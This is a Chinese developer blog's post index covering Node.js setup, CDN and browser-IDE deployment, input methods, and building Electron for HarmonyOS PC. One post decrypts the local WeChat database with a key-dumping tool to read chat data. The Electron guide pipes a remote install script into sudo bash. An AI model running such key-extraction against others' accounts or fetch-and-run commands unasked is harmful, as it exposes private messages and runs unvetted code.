v16.15.1 为例，进入 v16.15.1； 根据自己的系统下载相应的版本； darwin-arm64.tar.gz 结尾的是给 Mac Silicon（就是 M1、M2、M3……这些）用的； darwin-x64.tar.gz 结尾的是给 Mac Intel（英特尔 CPU）用的； linux-arm64.tar.gz 结尾的是给 64 位 ARM Linux 用的（大部分国产 CPU 都是）； linux-armv7l.tar.gz 结尾的是给 32 位 ARM Linux 用的（树莓派、路由器等等）； linux-x64.tar.gz 结尾的是给 64 位 x86 Linux 用的； win-x64.zip 结尾的是给 64 位 Windows 用的； win-x86.zip 结尾的是给 32 位 Windows 用的。 不要下载 msi 格式，需要管理员权限才能安装，而且无法多版本共存。 解压到你存放软件的目录； 配置环境变量 PATH 到解压后的 node.exe 可执行文件所在目录； Windows 系统配置环境变量（免管理员权限）： 打开 “开始” 菜单，输入 “环境变量”，点击 “编辑帐户的环境变量”； 双击上面用户变量中的 Path； 点新建，粘贴 node.exe 的所在路径，例如 D:\\dev\\node-v16.15.1-win-x64 把刚新建的路径上移到顶部； 一路确定。 Linux 系统配置环境变量（免 root 权限）： 打开终端； 执行 vi ~/.bashrc； 按 i 进入编辑模式； 按方向键定位到最后一行，然后另起一行； 输入 PATH=node所在路径:$PATH，注意中间是冒号分隔，不是分号，例如 PATH=/home/user/node-v16.15.1-linux-x64/bin:$PATH 按 esc 键退出编辑模式，输入 :wq 保存并退出。 彻底关闭所有命令窗口和开发软件（VSCode 等），然后重新打开； 执行 node -v 命令，如果能显示版本号，说明安装成功。 切换版本重复上方安装步骤 1~3，下载所需的 Node.js 版本，然后修改环境变量指向新下载的版本，然后关闭所有命令窗口和开发软件，重新打开即可。 这种方法无需 nvm，无需管理员权限，也无需重新安装 Node.js，即可实现版本切换，非常方便。","link":"/2024/setup-nodejs-without-admin/"},{"title":"腾讯云 EdgeOne 3.0 体验","text":"前几天腾讯云发布了 边缘安全加速平台 EdgeOne 3.0 版本，体验了一下，效果还不错！ 以上链接为推广链接，通过该链接购买产品，我将获得一定比例的佣金。本文并非受邀撰写，评测产品为自费购买，我会尽量客观地评价产品。 介绍EdgeOne 和 Cloudflare CDN 类似，属于防护型 CDN，可以隐藏源站地址，防护各种攻击，静态网站和动态网站都能用。 价格对于我这种小博客来说，买个人版（50GB 流量 + 300 万次请求/月）就够了。 送 14 天体验（10GB 流量 + 10 万次请求） 活动期间（8 月 6 日 ~ 8 月 11 日）36 一年 产品新用户 46 一年 老用户开通、续费都是 55 一年（活动价，不知道过了这个月以后是多少钱），每次续费最多续一年，由于我没有续费，尚不清楚最长能续费几年 价格看起来并不算很贵，不到 com 域名一年的价格，续费价格也正常，但是根据腾讯云的德行，我已经预感到以后会涨价背刺了，关键是不用再和 PCDN 盗刷流量的 xx 们斗智斗勇了，先开个 14 天试用玩玩！ 接入开通以后，首先需要加一条 TXT 记录验证顶级域名所有权，也可以跳过验证，之后再验证二级域名。 接着接入二级域名，可以选择 NS 接入、DNSPod 托管接入、CNAME 接入，我选择了 CNAME 接入，更好管理。 NS 接入：类似于 Cloudflare CDN 的接入方式，直接托管 name server DNSPod 接入：如果 name server 用的是 DNSPod，可以用这种接入方式，自动向 DNSPod 添加解析记录 CNAME 接入：手动往域名里添加 CNAME 记录 加速区域可以选择国内、国外、全球，不管选择什么区域，价格上都没区别，讲错了，不同区域的流量价格是不一样的，有备案就选全球，没有备案就选国外即可。 然后就是绑定源站，可以绑 IP，绑域名，绑存储桶（支持私有桶），也支持多个源站，和 CDN 的配置差不多。 绑好源站之后开通 IPv6，开通 HTTPS 访问，和 CDN 不同的是，EdgeOne 可以自动申请免费 Let’s Encrypt 证书，当然不想自动申请也可以选自己的证书。 加速然后是配置站点加速，EdgeOne 是通过规则引擎配置加速的，有点 CDN 基础还是很容易上手的。即使不懂也没关系，它提供了几套模板。 还支持资源自动压缩和图片处理。 对于动态网站或接口，可以设置一个请求头带上客户端 IP。 防护防护这一块我直接使用了默认的严格规则，毕竟一个静态网站也没什么漏洞可以钻的。 在盗刷防护上，它提供了限频功能，超出限频则返回 JavaScript 挑战，可以在不影响浏览器访问的同时，防止被脚本盗刷。 如果碰到某个区域的集中攻击，EdgeOne 还提供了按区域拉黑功能（国内精确到省，国外精确到国家或地区），大赞！ 也可以自定义规则来屏蔽某些具体的 IP 地址段。 DDoS 防护也成为标配了。 被屏蔽的客户端会提示访问受限。 封顶即使已经有了这么多防护，用量封顶仍然是有必要的，你也不想晚上睡觉的时候被刷爆吧。 监控EdgeOne 的监控能力可以说十分全面了，涵盖了时间、区域、Host、IP、Referer、URL、文件后缀、状态码、浏览器、设备类型、操作系统。 总结EdgeOne 在 CDN 的基础上，提升了监控能力和防护能力，算是弥补了国内没有 Cloudflare 的痛，功能上甚至比 Cloudflare 更加自由，个人版在价格上也不算很贵，希望以后不会涨价。 但它在套餐上提供的选项太少，起步 50GB 的套餐对于许多小网站来说还是有点高了，如果能学习又拍云联盟的做法，通过推广获取免费额度，想必会更受欢迎。 坑点开通体验套餐之后，如果要切换到收费套餐，需要全部重新配置一遍，对，它不支持切换套餐……重新配置花了我半天时间！ 感谢 大大的小蜗牛 提醒，国外流量并不是按 1:1 结算的，这一点难以察觉，查阅文档之后才发现。 数据整理自 套餐费用 和 套餐外超量费用（后付费） 地区 套餐内每实际消耗 1G 流量扣多少 G 套餐外流量价格（0 - 2 TB，元/GB） 中国大陆 CN 1 GB 0.31 北美 NA 1.71 GB 0.53 欧洲 EU 1.71 GB 0.53 亚太 1 区 AP1 2.49 GB 0.77 亚太 2 区 AP2 2.68 GB 0.83 亚太 3 区 AP3 2.78 GB 0.86 中东 ME 2.91 GB 0.90 非洲 AA 2.91 GB 0.90 南美 SA 2.91 GB 0.90 可以看到国外的费用是高于国内的！如果是国内网站还行，如果是面向国外的网站，或许有更好的选择。","link":"/2024/tencent-edge-one-experence/"},{"title":"VSLite 原理解析与本地化部署","text":"VSLite 是一个开源的、完全运行在浏览器中的开发环境，它的亮点在于，不需要联网也可以直接在浏览器中使用 Node.js、Python、Git 等工具。你可以在 vslite.dev 体验到在线 demo。 传统的基于云的开发环境，例如 GitHub Codespaces，依赖于后端服务，前端所执行的命令，实际上是通过网络请求发送到后端对应的云虚拟机（或容器）中执行的，这就需要消耗后端的计算资源；而 VSLite 的思路完全不同，它在浏览器中启动了一个容器，做到了不再依赖后端。 想要在浏览器中跑起来一个容器，第一次听说这样的想法时，我说：不可能！绝对不可能！就浏览器这也受限那也受限的环境，还能跑起来一个操作系统？然而 StackBlitz 真的做到了，他们开发出了 WebContainers，WebContainers 是一个基于浏览器的运行时，用于执行 Node.js 程序和操作系统命令，完全在浏览器选项卡中。以前需要云虚拟机才能执行的应用，现在可以完全在浏览器端运行。 经过两天的研究，我开始对 WebContainers 的原理有了初步的了解。 真假离线环境？一开始我对浏览器能运行容器持怀疑态度，为了证明真是浏览器在运行容器，而不是某台远程的虚拟机，我拉取了 VSLite 项目，本地启动，然后断开网络访问 localhost:5101，果然根本无法加载，哈哈！露馅了吧？ 重新连接网络，打开浏览器开发者工具能发现，容器启动过程需要向 staticblitz.com 发送数百个请求，难道它其实还是在线运行的？ 改进一下步骤，先在联网状态下打开本地环境，等待加载完成之后断网，然后在终端中执行一段命令。诶？执行成功了？再瞅瞅操作系统，也能正常打印，居然还是 Ubuntu。 这下破案了，容器在启动过程需要从 staticblitz 的域名获取一系列资源，在启动完成后断网则不影响使用。浏览器运行容器，还真让他给实现了。 但我既然选择 VSLite，是因为它不需要连接云服务，这下还是要连接 staticblitz，没满足我的需求啊，我想本地部署。 查阅文档，根据 WebContainers 文档上的许可协议，本地化部署是需要商用授权的，所以文档上也无法找到任何有关本地部署的指导。 本地部署！没有文档，那就读源码，自己研究原理，开搞！ 等等，WebContainers 好像没开源…… 等等，我可以看到 @webcontainer/api 这个包的代码，而且好在他们没给代码做混淆。 打开 node_modules/@webcontainer/api/dist/index.js，发现了这一段代码： 12345const DEFAULT_IFRAME_SOURCE = 'https://stackblitz.com/headless';// ......function getIframeUrl() { return new URL(window.WEBCONTAINER_API_IFRAME_URL ?? DEFAULT_IFRAME_SOURCE);} 这个网址就是首个发送到 staticblitz 的请求，它被设置到一个 iframe 的 src 中，这个请求返回了什么呢？ 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;StackBlitz&lt;/title&gt;&lt;script src=&quot;https://w-corp-staticblitz.com/webcontainer.9e2d28a3.js&quot;&gt;&lt;/script&gt;&lt;link rel=&quot;preload&quot; as=&quot;script&quot; href=&quot;https://w-corp-staticblitz.com/webcontainer.9e2d28a3.js&quot; fetchpriority=&quot;low&quot;&gt;&lt;link rel=&quot;preload&quot; as=&quot;script&quot; href=&quot;https://w-corp-staticblitz.com/fetch.worker.9e2d28a3.js&quot; fetchpriority=&quot;low&quot;&gt;&lt;script src=&quot;https://c.staticblitz.com/assets/vite/headless-BNfRU0p-.js&quot; crossorigin=&quot;anonymous&quot; type=&quot;module&quot;&gt;&lt;/script&gt;&lt;link rel=&quot;modulepreload&quot; href=&quot;https://c.staticblitz.com/assets/vite/semver-Zyv2pDaP.js&quot; as=&quot;script&quot; crossorigin=&quot;anonymous&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;application/json&quot; id=&quot;webcontainer-context&quot;&gt;{&quot;options&quot;:{&quot;baseUrl&quot;:&quot;https://w-corp-staticblitz.com&quot;,&quot;initOptions&quot;:{&quot;server&quot;:&quot;https://local-corp.webcontainer-api.io&quot;,&quot;isolationPolicy&quot;:&quot;require-corp&quot;,&quot;version&quot;:&quot;9e2d28a3&quot;,&quot;flattenedServer&quot;:false},&quot;systemBinaries&quot;:{},&quot;git&quot;:{&quot;proxy&quot;:&quot;https://p.stackblitz.com&quot;},&quot;turboBaseUrl&quot;:&quot;https://t.staticblitz.com&quot;,&quot;registryProxy&quot;:&quot;https://nr.staticblitz.com&quot;,&quot;registryMaxConcurrency&quot;:&quot;&quot;},&quot;embedder&quot;:&quot;https://vslite.dev/&quot;,&quot;shortAppId&quot;:false}&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 本地化部署的核心在于把请求公网的资源，全部在本地 mock 一遍，也就是把上面看到的所有网址全部指向本地。 我们先把这个文件保存到 VSLite 项目的 public/wc/headless 中（这里的 wc 是我随便取的，取自 WebContainers 的首字母）。 刚才注意到容器启动会先判断有无 window.WEBCONTAINER_API_IFRAME_URL，所以只需要在容器启动前修改这个值就可以了。 修改 src/vite-env.d.ts 1234declare module globalThis { // ...... var WEBCONTAINER_API_IFRAME_URL: string;} 阅读 WebContainers 文档得知，启动容器的命令是 WebContainer.boot，全局搜一下，只有一处，在 src/hooks/useShell.ts，在这行代码前面加一行 1window.WEBCONTAINER_API_IFRAME_URL = window.location.origin + '/wc/headless'; 这样，第一个请求就本地化成功了。 我们继续看 headless 文件，发现里面还涉及到多个 js 文件和后端地址，然而我无法确定具体发往这些地址的请求，咋办？ 有一个偷懒的办法，浏览器先打开一个标签，打开开发者工具切到 Network 标签，然后访问 vslite.dev，加载完成之后，右键任意一个请求，点击 Copy - Copy all URLs，嘿嘿，所有用到的请求就都复制出来了。 根据这些请求的文件，我也对 WebContainers 的启动过程有了一个认识，full_bin_index.9e2d28a3 和几个 wasm 文件组成了一个精简版的操作系统镜像，这个镜像在 WebAssembly 环境中运行，并通过 Service Worker 和前端页面通讯。 找个批量下载工具（例如迅雷、aria2…）依次下载所有涉及到的资源，全部放到 public 里面。然后修改 headless 文件，把所有请求地址都改成本地地址。 改完后发现还有一部分 monaco-editor 的资源请求，这部分就比较简单了。 先用 npm info 查一下 monaco-editor 的下载地址，看输出的 tarball 就是下载地址 1npm info monaco-editor@0.36.1 下载下来 1curl -LO https://registry.npmmirror.com/monaco-editor/-/monaco-editor-0.36.1.tgz 再解压 1tar -xzf monaco-editor-0.36.1.tgz 解压 monaco-editor 后，只需把里面的 min 目录移动到 public/monaco-editor-0.36.1，其他的都不需要，删除。 然后看一下项目怎么引入 monaco 的，发现用的是 @monaco-editor/react，看一下这个包的文档，里面说可以通过 loader-config 来自定义 monaco 文件地址。 12import { loader } from '@monaco-editor/react';loader.config({ paths: { vs: window.location.origin + '/monaco-editor-0.36.1/min/vs' } }); 把这行放在 src/hooks/useStartup.ts 的 useMonaco() 之前，monaco 的本地化就完成了。 最后 public 目录中一共放了这么些文件。 至此，VSLite 的本地化工作已经初步完成，断网访问 localhost:5101，容器正常加载，创建一个 js 文件用 node 执行试试，也可以正常执行。 以上所有的改动都可以在 我的 GitHub 找到。 你可能会意识到，headless 里面还有 p.stackblitz.com、t.staticblitz.com、nr.staticblitz.com，这三个地址没有本地化，他们的作用是反向代理 Git 请求和 npm 请求（可能是为了跨域？），这部分请求无法简单通过静态 mock，经过实测，这不妨碍 WebContainers 加载，但会影响 git clone 和 npm install，有兴趣的朋友可以试试自己搭建 proxy 来解决这个问题！","link":"/2024/vslite-offline/"},{"title":"如何使用 yarn 或 pnpm 安装 sqlite3","text":"Node.js 项目安装 SQLite 时需要下载预编译 bundle，默认是从 github.com 下载的，下载失败会走 node-gyp 本地编译，本地编译一般会因为缺少 Python、Visual Studio、Xcode 等环境而报错，所以需要配置镜像地址。 npm 安装 sqlite31npm install sqlite3@5.1.6 --node_sqlite3_binary_host_mirror=https://registry.npmmirror.com/-/binary/sqlite3/ yarn 或 pnpm 安装 sqlite3使用 yarn 安装时，使用和 npm 相同的参数居然不管用了，查阅 @mapbox/node-pre-gyp 的 源码 发现： 1const host = process.env['npm_config_' + validModuleName + '_binary_host_mirror'] || package_json.binary.host; 原来是环境变量需要加 npm_config_ 前缀！ Linux 或 Mac： 12npm_config_node_sqlite3_binary_host_mirror=https://registry.npmmirror.com/-/binary/sqlite3/ yarn add sqlite3@5.1.6npm_config_node_sqlite3_binary_host_mirror=https://registry.npmmirror.com/-/binary/sqlite3/ pnpm add sqlite3@5.1.6 Windows： 123setx node_sqlite3_binary_host_mirror https://registry.npmmirror.com/-/binary/sqlite3/yarn add sqlite3@5.1.6pnpm add sqlite3@5.1.6 为什么不安装最新的 5.1.7 而是安装 5.1.6？原因在这里：https://github.com/TryGhost/node-sqlite3/issues/1773","link":"/2024/yarn-add-sqlite3/"},{"title":"2025 年了，安卓平板上什么第三方九键输入法最好用？","text":"题外话，我换过好多平板，我理想中的平板是 11 寸，这个大小不至于太重，又不至于屏幕太小，要搭载顶级处理器，玩游戏不卡顿，最好支持解锁 BL。 第一台平板是 iPad Pro 2018 11 寸，这个平板陪伴了我整整 6 年，依然流畅如新，奈何现如今带不动绝区零等大型游戏了，卖掉了。 第二台平板是小米平板 7，太卡！本来澎湃就吃硬件，还用了个 7+ Gen 3，掉帧死机家常便饭，还无法通过小米的解锁考试，卖掉了。 第三台是一加平板 2 Pro，顶级配置，一个 fastboot 命令就能轻松解锁，然而第一次用 13 寸，好重啊，躺着更是没法玩，使用频率都降低了，卖掉了。 第四台也就是现在用的，联想拯救者 Y700，虽然 8 寸是小了点，但毕竟很轻，很容易就接受了。 联想平板系统就像毛坯房，预装的输入法功能实在太少，决定装一个第三方的输入法，于是考虑如下选择： Gboard（谷歌） 百度输入法 搜狗输入法 讯飞输入法 微信输入法 首先我是一位九键用户，九键在横屏模式下好不好用是我选择一个输入法的重要标准，我认为理想的九键布局，是我正在使用的 VIVO 输入法的布局，这种布局能够在横屏（或者展开形态的折叠屏）状态时，轻松单手打字。 其次是支持剪切板、个性短语，方便快速输入地址、手机号等信息，这基本上已经是各家标配功能了。 Gboard 谷歌出品的输入法在风格上完全遵守自家的设计规范，英文键盘更加贴近实体键盘的键位，很容易上手，然而九键在横屏下不支持分屏，横屏打字就比较难受了。 百度输入法 百度输入法的九键布局是我最喜欢的，自定义程度也很高，能合能分，但在联想平板上有一个 bug，清理后台会导致百度输入法失去默认输入法地位，每次清后台都要去重新设置回百度输入法，折腾几次就不想用了。 百度输入法小米版 小米版中文和原版相同，英文是和 Gboard 一样的实体键盘布局，但在联想平板上有一个 bug，每次弹出键盘都要弹出用户须知： 不管是同意还是拒绝，下次还会弹出，权限管理中授予了所有权限也不行，酷安里也看到有相同的反馈，但没有找到解决方案，遂放弃研究。 搜狗输入法 搜狗输入法的九键布局有两个奇怪的地方： 数字键 1 会显示为「分词」，去设置中关闭分词功能可以变回来，但没有分词就不能方便地打出「西安」、「酷安」这类词了； 符号中有一个歪歪扭扭的 .COM，还不能改，强迫症实在看不下去了。 讯飞输入法 讯飞九键中间可以手写，这个设计让人眼前一亮，但它占了很大的空间，无法调整，我用手写的频率是很少的，没必要为了这个牺牲九键的空间。 微信输入法 微信输入法相比百度和搜狗，界面更加简洁干净无广告，和其他输入法数字键+九键的布局不同，微信一边是选词区，一边是九键，这种布局一开始不太适应，但用两分钟就会发现，选词的使用频率是高于数字键盘的，更大的选词区确实方便不少。微信输入法还直接支持外接键盘打字，外接键盘不用来回切换输入法了： 一个星期体验下来也没有什么明显的 bug。要说缺点，就是导入词库有点难搞，我 PC 上的主力输入法是 Rime 小狼毫，要是微信能直接导入 txt 词库就方便了。 经过以上对比，最后我选择了微信输入法。","link":"/2025/android-pad-input-method/"},{"title":"bat 脚本打印输出彩色文字","text":"要在 Windows 批处理脚本中打印彩色内容，通常的方式是 echo [32mHello World[0m，但这种方式需要输入特殊字符 ESC（ASCII 码为 27），我试过 Alt+027 的快捷键却怎么也打不出来这个字符，而且这种方式各个颜色的编码也很不好记，分享一种更简单的方法！ https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/write-host 12345678910111213141516powershell -Command &quot;Write-Host 'This is Black' -ForegroundColor White -BackgroundColor Black&quot;powershell -Command &quot;Write-Host 'This is DarkBlue' -ForegroundColor White -BackgroundColor DarkBlue&quot;powershell -Command &quot;Write-Host 'This is DarkGreen' -ForegroundColor White -BackgroundColor DarkGreen&quot;powershell -Command &quot;Write-Host 'This is DarkCyan' -ForegroundColor White -BackgroundColor DarkCyan&quot;powershell -Command &quot;Write-Host 'This is DarkRed' -ForegroundColor White -BackgroundColor DarkRed&quot;powershell -Command &quot;Write-Host 'This is DarkMagenta' -ForegroundColor White -BackgroundColor DarkMagenta&quot;powershell -Command &quot;Write-Host 'This is DarkYellow' -ForegroundColor White -BackgroundColor DarkYellow&quot;powershell -Command &quot;Write-Host 'This is Gray' -ForegroundColor Black -BackgroundColor Gray&quot;powershell -Command &quot;Write-Host 'This is DarkGray' -ForegroundColor White -BackgroundColor DarkGray&quot;powershell -Command &quot;Write-Host 'This is Blue' -ForegroundColor White -BackgroundColor Blue&quot;powershell -Command &quot;Write-Host 'This is Green' -ForegroundColor White -BackgroundColor Green&quot;powershell -Command &quot;Write-Host 'This is Cyan' -ForegroundColor Black -BackgroundColor Cyan&quot;powershell -Command &quot;Write-Host 'This is Red' -ForegroundColor White -BackgroundColor Red&quot;powershell -Command &quot;Write-Host 'This is Magenta' -ForegroundColor White -BackgroundColor Magenta&quot;powershell -Command &quot;Write-Host 'This is Yellow' -ForegroundColor Black -BackgroundColor Yellow&quot;powershell -Command &quot;Write-Host 'This is White' -ForegroundColor Black -BackgroundColor White&quot; 其中单引号内是打印的文字内容，ForegroundColor 参数传文字颜色，BackgroundColor 参数传背景颜色，直接传颜色名字，非常方便。 如果在批处理中使用，可以定义一个函数，调用起来更简洁。 123456789@echo offcall :print &quot;Hello, world!&quot; Yellow Redcall :print &quot;Hello, iMaeGoo!&quot; White Blueexit /b 0:printpowershell -Command &quot;Write-Host '%1' -ForegroundColor %2 -BackgroundColor %3&quot;goto:eof 效果","link":"/2025/bat-color/"},{"title":"腾讯代码托管服务 Coding 将停服","text":"腾讯云本周宣布 Coding 将在今年 9 月 1 日起停止免费版服务，2028 年 9 月 30 日彻底停止服务。 原公告：https://cloud.tencent.com/document/product/1726/116235 对此我居然一点也不感到意外，毕竟也不是被背刺一回两回了，就是花了点时间把 Coding 上面的代码迁移到阿里云 Codeup。 公告上说推荐迁移到他们的新一代产品《云原生构建》，我试了一下，连 SSH 都不支持，只能 HTTPS 方式克隆，直接告辞。","link":"/2025/coding-end-of-service/"},{"title":"扣子空间邀请码","text":"字节跳动出了一个类 Manus 的 AI Agent 工具，叫扣子空间，目前是邀请码内测机制，在此分享几个邀请码。 邀请码使用地址: https://space.coze.cn 用完记得评论说下已使用，如果邀请码都已使用，可以评论提醒我补充更多的邀请码。 12345Q4RA5622 已激活54W9053G 已激活4YUTZNOV 已激活XFZKRCIZ 已激活HZFQRQVC 已激活 续 1发出来才 3 分钟不到就全被用了，然而没一个人留言。有真正需求的可以关注博客页面左边的公众号（虹墨iMaeGoo）私信我获取。 续 2我的所有 20 个邀请码都发放完毕了，你可以通过其他渠道获得邀请码 - https://docs.qq.com/sheet/DUkdXa1JtQWtlSXJp 续 3更多邀请码放出 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869708D01YILO 已激活SCFBW27F 已激活GPI4P0OL 已激活EDW7VRLW 已激活3HIZ37XF 已激活Q4RA5622 已激活54W9053G 已激活4YUTZNOV 已激活XFZKRCIZ 已激活HZFQRQVC 已激活D7FWIMJ4 已激活H9ZM7KQ1 已激活94PYYP6R 已激活5HO53HQL 已激活4YQYH3BC 已激活C5QJ9RUZ 已激活42BGV4OD 已激活C5IKZ13G 已激活F4R5RQWX 已激活P449LTOC 已激活RAL58FKV 已激活H7K47ET3 已激活IP765WVL 已激活H8WDAT20 已激活ST25AOYY 已激活V0NRUE3G 已激活KM0M6HN1 已激活S97PP4AU 已激活HE830CXE 已激活I2ODIZ9M 已激活CCLLI44L 已激活MLNM7A0J 已激活BB2HDWAE 已激活MLS3IYRN 已激活9LL7XO6G 已激活WDIE546J 已激活96OSOHQT 已激活EDJ182QW 已激活LUPTYN8S 已激活OSIF6AYZ 已激活BED56SSX 已激活2M7GCFDZ 已激活CSDP4RGF 已激活YIMVWMDB 已激活HFZAHFQV 已激活1ZP0HMH5 已激活HHF0R59D 已激活8QPRC46N 已激活G9GAKQ1V 已激活VN8YCOSM 已激活BKIE162P 已激活K4U0ALR0 已激活ZEC6EJN8 已激活8LFS25M2 已激活CGGCT0JK 已激活33XCKI66 已激活N32IX2ED 已激活5BM48I2I 已激活XJ8YJ9BQ 已激活FG677MC8 已激活CPQAI352 已激活3FL0OJ28 已激活FQQ6GR3O 已激活HZX6TK2L 已激活HEVFPIR7 已激活BOLFJACA 已激活7R7NYYSU 已激活MZRZF6OO 已激活N65LQH12 已激活XH8QCFBT 已激活","link":"/2025/coze-space-code/"},{"title":"将扣子空间生成的 jsx 格式网页部署到自己的服务器","text":"扣子空间生成的网页是 jsx 格式的，在扣子空间内可以正常打开，如果想要部署到自己的服务器，则需要经过编译。 为此，我写了一个模板，只需将扣子空间生成的 jsx 重命名为 coze.tsx（注意后缀要改为 tsx）放入本项目 src 目录，即可编译出可静态部署的 dist 产物。 详细步骤 从扣子空间下载 jsx 文件 下载 模板工程 安装 Node.js 进入本项目所在目录，运行 npm install -g pnpm 安装 pnpm 包管理器 运行 pnpm install 安装依赖 将扣子空间生成的 jsx 重命名为 coze.tsx（注意后缀要改为 tsx），放入 src 目录，覆盖原有的 coze.tsx 文件 检查 coze.tsx 中的 import 语句，确保所有第三方包都已经安装，举例：如果 coze.tsx 中有 import Mermaid from 'mermaid';，就执行安装 pnpm install mermaid 运行 pnpm run dev 查看效果 运行 pnpm run build 编译 编译完成后，在 dist 目录下即可找到编译后的产物","link":"/2025/coze-space-jsx/"},{"title":"微信快速找出自己创建的群聊","text":"微信本身没有筛选自己创建的群聊的功能，需要将微信的数据库解密，然后通过 SQL 语句查询。 下载所需工具 微信 4.0.3.22 Windows 版本，最新版本的不行，下载地址: https://github.com/cscnk52/wechat-windows-versions/releases/tag/v4.0.3.22 (如果这个地址没了就自己再找) wechat-dump-rs，下载地址: https://github.com/0xlane/wechat-dump-rs/releases DB Browser for SQLite，下载地址: https://sqlitebrowser.org/dl/#windows 解密数据库 登录微信，保持微信运行 打开 cmd，cd 到 wechat-dump-rs.exe 所在目录 执行 wechat-dump-rs.exe -a 如果看到 decryption complete!! 就成功了，output to 后面就是解密后的数据库路径 打开数据库 到 DB Browser for SQLite 的安装目录，打开 DB Browser for SQLCipher.exe 打开数据库，定位到上一步 output 的目录，打开 contact/contact.db 点执行 SQL 粘贴以下语句，点执行 123456SELECT chat_room.owner, contact.nick_nameFROM chat_roomLEFT JOIN contactON chat_room.username = contact.usernameWHERE chat_room.owner = &quot;换成你的微信号&quot;AND contact.is_in_chat_room != 2; 就可以看到所有自己创建的微信群了","link":"/2025/find-owned-weixin-group/"},{"title":"鸿蒙 PC 编译运行 Electron 应用","text":"华为推出的 MateBook Pro 首次搭载了鸿蒙 PC 操作系统，使其能够直接运行鸿蒙手机应用和鸿蒙平板应用，但仅仅这样只能称得上是『大号平板』。 Electron 框架是优秀的跨平台客户端框架，通过改造，鸿蒙 PC 上也能运行 Electron 应用，具体如何操作呢？ 编译 Electron可以自己编译，也可以用华为预编译好的版本。 自己编译参考文档：https://gitcode.com/openharmony-sig/electron 编译环境必须使用 Ubuntu 22.04，可以用虚拟机。 编译耗时很长，我用 8 核虚拟机 跑了大概 8 个小时左右，如无特殊需求建议用华为预编译好的版本。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465# 安装工具git-lfs, ccache。注：该步骤仅在首次拉取代码时需要执行sudo apt install -y git-lfs ccache curl python3 python-is-python3 python3-pippython --versionpip --version# 下载码云repo工具(可以参考码云帮助中心：https://gitee.com/help/articles/4316)mkdir -p ~/bincurl https://gitee.com/oschina/repo/raw/fork_flow/repo-py3 &gt; ~/bin/repochmod a+x ~/bin/repoecho 'export PATH=~/bin/:$PATH' &gt;&gt; ~/.bashrcsource ~/.bashrcpip install -i https://pypi.tuna.tsinghua.edu.cn/simple requests# 通过NodeSource仓库安装node和npmcurl -fsSL https://deb.nodesource.com/setup_lts.x | sudo -E bash -sudo apt install -y nodejsnode -vnpm -v# 使用https拉取chromium-electron代码git clone -b master https://gitcode.com/openharmony-sig/electron.git# 执行命令`git lfs pull`，确保仓库中的大文件已经下载完成cd electrongit lfs pull# 拉取chromium-electron对应的ohos chromium代码git config --global user.name &quot;iMaeGoo&quot;git config --global user.email &quot;mail1st@qq.com&quot;repo init -u https://gitcode.com/openharmony-tpc/manifest.git -b pc_chromium_132 -m pc_chromium_132_20251106.xml --no-repo-verifyrepo sync -c # 可以执行多次，以确保代码全部拉取成功repo forall -c 'git lfs pull' # 可执行多次，以确保大文件全部拉取成功# 应用chromium-electron的patch到ohos chromiumpushd srcfind -name &quot;*.git*&quot; -exec rm -rf &quot;{}&quot; \\;popdchmod +x override_files.sh./override_files.sh# 运行 Electron实际目录/src/build/install-build-deps.sh脚本，安装编译所需的软件包。注：该步骤仅在首次拉取代码时需要执行sudo ./src/build/install-build-deps.sh --no-chromeos-fonts# 运行脚本electron_build.sh./electron_build.sh# 可以通过如下脚本拷贝所需资源(注：请参考修改为自己的source_path)source_path=./Electron实际目录/src/out/musl_64destination_path=./electronif [ -d ${destination_path} ];then rm -rf ${destination_path}fimkdir ${destination_path}cp ${source_path}/libelectron.so ${destination_path}cp ${source_path}/libffmpeg.so ${destination_path}cp ${source_path}/libadapter.so ${destination_path}cp ${source_path}/electron ${destination_path}cp ${source_path}/icudtl.dat ${destination_path}cp ${source_path}/v8_context_snapshot.bin ${destination_path}cp ${source_path}/chrome_100_percent.pak ${destination_path}cp ${source_path}/chrome_200_percent.pak ${destination_path}cp ${source_path}/resources.pak ${destination_path}mkdir ${destination_path}/localescp ${source_path}/locales/zh-CN.pak ${destination_path}/localescp ${source_path}/locales/en-US.pak ${destination_path}/locales 使用预编译版本没有调用 addon 和 ArkTS 的需求时可以直接使用以下二进制 release 包进行开发。 获取最新日期的二进制 release 包，华为账号登录仓库，下载默认 Electron 34 的 release 包。 解压 搭建环境安装 DevEco Studio，目前是 5.1.0，最新版即可 https://developer.huawei.com/consumer/cn/download/ 配置环境变量，这样以后能方便地使用 hdc 等命令 假设安装路径是 D:\\dev\\DevEcoStudio，就在 PATH 中增加 D:\\dev\\DevEcoStudio\\sdk\\default\\openharmony\\toolchains 运行项目打开 DevEco，打开前面编译/下载好的项目 ohos_hap 首次运行需要证书，按提示登录华为账号即可生成证书 跑起来的效果，按 Ctrl + Alt + I 可以打开调试 Electron 的入口点在 src/main/resources/resfile/resources/app/main.js，修改后重新运行即可看到效果 123456789101112131415const { app, BrowserWindow, Tray, nativeImage } = require('electron');const path = require('path');let mainWindow, tray;function createWindow() { tray = new Tray(nativeImage.createFromPath(path.join(__dirname, 'electron_white.png'))); mainWindow = new BrowserWindow({ width: 800, height: 600, }); mainWindow.setWindowButtonVisibility(true); mainWindow.loadURL('https://caiyunapp.com/map/');}app.whenReady().then(createWindow);","link":"/2025/harmony-pc-electron/"},{"title":"在线工具 - 富文本转 Markdown","text":"只需在以下文本框中粘贴网页或 Word 文档的内容，即可转换为 Markdown 格式！ 与网上现有工具相比，这个能支持表格转换！ 粘贴网页内容 / Word 文档内容 #editor—wrapper { border: 1px solid #ccc; z-index: 999; } #toolbar-container { border-bottom: 1px solid #ccc; } #editor-container { height: 300px; } #html-content, #md-content { height: 300px; } 转换后的 Markdown 内容 document.head.appendChild( Object.assign(document.createElement(\"link\"), { rel: \"stylesheet\", href: \"https://registry.npmmirror.com/@wangeditor/editor/5.1.23/files/dist/css/style.css\", }) ); const { createEditor, createToolbar } = window.wangEditor; const turndownService = new TurndownService({ headingStyle: \"atx\", hr: \"----\", bulletListMarker: \"-\", codeBlockStyle: \"fenced\", }); turndownService.use(TurndownPluginGfmService.gfm); const editorConfig = { placeholder: \"粘贴 HTML 内容\", onChange(editor) { const html = editor.getHtml(); const markdown = 